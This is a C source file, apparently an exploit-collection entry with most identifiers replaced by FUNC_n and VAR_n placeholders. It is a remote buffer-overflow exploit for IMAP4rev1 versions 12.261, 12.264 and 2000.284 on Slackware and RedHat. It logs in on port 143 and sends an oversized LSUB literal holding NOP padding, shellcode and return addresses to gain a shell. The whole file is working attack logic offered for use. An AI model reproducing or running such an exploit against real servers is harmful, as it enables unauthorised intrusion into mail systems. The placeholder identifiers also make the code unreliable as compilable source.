
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {char sin_addr; int sin_zero; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {char* h_addr; int h_length; } ;
typedef int sin ;


 int VAR_0 ;
 int FUNC_0 (char*) ;
 char VAR_1 ;
 int FUNC_1 (int,char*) ;
 long VAR_2 ;
 long VAR_3 ;
 long VAR_4 ;
 long VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int FUNC_2 (int ) ;
 long FUNC_3 (char*) ;
 int FUNC_4 (int *,int) ;
 int FUNC_5 (int) ;
 scalar_t__ FUNC_6 (int,struct sockaddr*,int) ;
 scalar_t__ VAR_10 ;
 int VAR_11 ;
 int FUNC_7 (int) ;
 int FUNC_8 (int ,char*,...) ;
 struct hostent* FUNC_9 (char*) ;
 int FUNC_10 (int) ;
 int FUNC_11 (char*,char*,int) ;
 int FUNC_12 (int,int) ;
 int FUNC_13 (char*) ;
 int VAR_12 ;
 char* VAR_13 ;
 int FUNC_14 (int ,int ) ;
 int FUNC_15 (int ,int ,int ) ;
 int FUNC_16 (char*,char*,...) ;
 int VAR_14 ;
 char* FUNC_17 (int ) ;
 int FUNC_18 (char*) ;
 int FUNC_19 (char*,char*) ;
 int FUNC_20 (int,char*,int) ;

int FUNC_21(int VAR_15, char **VAR_16) {
 char VAR_17[VAR_7], VAR_18[2048];
 char *VAR_19, *VAR_20;
 long VAR_21;
 struct sockaddr_in VAR_22;
 struct hostent *VAR_23;
 int VAR_24, VAR_25;

 FUNC_8(VAR_14, "\nRemote exploit for IMAP4rev1 v12.261, v12.264 and 2000.284\n"
  "Developed by SkyLaZarT - www.BufferOverflow.org\n\n");

 if ( VAR_15 < 5 ) {
  FUNC_8(VAR_14, "%s <host> <login> <password> <type> [offset]\n", VAR_16[0]);
  FUNC_8(VAR_14, "\ttype: [0]\tSlackware 7.0 with IMAP4rev1 v12.261\n"
    "\ttype: [1]\tSlackware 7.1 with IMAP4rev1 v12.264\n"
    "\ttype: [2]\tRedHat 6.2 ZooT with IMAP4rev1 v12.264\n"
    "\ttype: [3]\tSlackware 7.0 with IMAP4rev1 2000.284\n\n");


  FUNC_7(-1);
 }

 VAR_19 = VAR_16[2];
 VAR_20 = VAR_16[3];

 switch(FUNC_3(VAR_16[4])) {
  case 0: VAR_21 = VAR_2; break;
  case 1: VAR_21 = VAR_3; break;
  case 2: VAR_21 = VAR_4; break;
  case 3: VAR_21 = VAR_5; break;
  default:
   FUNC_8(VAR_14, "invalid type.. assuming default "
    "type 0\n");
   VAR_21 = VAR_2; break;

 }

 if ( VAR_15 == 6 )
  VAR_21 += FUNC_3(VAR_16[5]);

 FUNC_14(VAR_6, VAR_12);

 FUNC_8(VAR_14, "Trying to exploit %s...\n", VAR_16[1]);

 FUNC_8(VAR_14, "Using return address 0x%08lx. Shellcode size: %i bytes\n\n", VAR_21, FUNC_18(VAR_13));


 FUNC_2(VAR_9);
 VAR_23 = FUNC_9(VAR_16[1]);
 if (!VAR_23) {
  FUNC_8(VAR_14, "Unknow hostname : %s\n", FUNC_17(VAR_11));
  FUNC_7(-1);
 }
 FUNC_2(0);

 VAR_24 = FUNC_15(VAR_0, VAR_8, 0);
 if ( VAR_24 < 0 ) {
  FUNC_13("socket()");
  FUNC_7(-1);
 }

 VAR_22.sin_family = VAR_0;
 VAR_22.sin_port = FUNC_10(143);
 FUNC_11(&VAR_22.sin_addr, VAR_23->h_addr, VAR_23->h_length);
 FUNC_4(&(VAR_22.sin_zero), 8);

 FUNC_8(VAR_14, "Connecting... ");
 FUNC_2(VAR_9);
 if ( FUNC_6(VAR_24, (struct sockaddr *)&VAR_22, sizeof(VAR_22)) < 0 ) {
  FUNC_8(VAR_14, "failed to %s:143\n", VAR_16[1]);
  FUNC_7(-1);
 }
 FUNC_2(0);

 FUNC_8(VAR_14, "OK\n");


        for ( VAR_25 = 0; VAR_25 <= VAR_7; VAR_25 += 4 )
                *(long *)&VAR_17[VAR_25] = VAR_21;

        for ( VAR_25 = 0; VAR_25 < ( VAR_7 - FUNC_18(VAR_13) - 100); VAR_25++ )
                *(VAR_17+VAR_25) = VAR_1;

        FUNC_11(VAR_17 + VAR_25, VAR_13, FUNC_18(VAR_13));

 FUNC_0(VAR_18);
 FUNC_1(VAR_24, VAR_18);

 if(VAR_10) FUNC_8(VAR_14, "debug %s", VAR_18);

 FUNC_8(VAR_14, "Trying to loging ... ");

 FUNC_16(VAR_18, "1 LOGIN %s %s\n", VAR_19, VAR_20);
 FUNC_20(VAR_24, VAR_18, FUNC_18(VAR_18));

 FUNC_0(VAR_18);
 FUNC_1(VAR_24, VAR_18);

 if(VAR_10) FUNC_8(VAR_14, "debug %s", VAR_18);

 if (!(FUNC_19(VAR_18, "OK LOGIN completed"))) {
  FUNC_8(VAR_14, "Login failed!!\n");
  FUNC_5(VAR_24);
  FUNC_7(-1);
 }

 FUNC_8(VAR_14, "OK\n");

 FUNC_0(VAR_18);
 FUNC_16(VAR_18, "1 LSUB \"\" {1064}\r\n");
 FUNC_20(VAR_24, VAR_18, FUNC_18(VAR_18));

        FUNC_0(VAR_18);
        FUNC_1(VAR_24, VAR_18);

 if(VAR_10) FUNC_8(VAR_14, "debug %s", VAR_18);

 if(!(FUNC_19(VAR_18, "Ready"))) {
  FUNC_8(VAR_14, "LSUB command failed\n");
  FUNC_5(VAR_24);
  FUNC_7(-1);
 }

 FUNC_8(VAR_14, "Sending shellcode... ");

 FUNC_20(VAR_24, VAR_17, 1064);
 FUNC_20(VAR_24, "\r\n", 2);

 FUNC_8(VAR_14, "OK\n");

 FUNC_8(VAR_14, "PRESS ENTER for exploit status!!\n\n");

 FUNC_12(VAR_24, 1);

 FUNC_5(VAR_24);

 return 0;
}
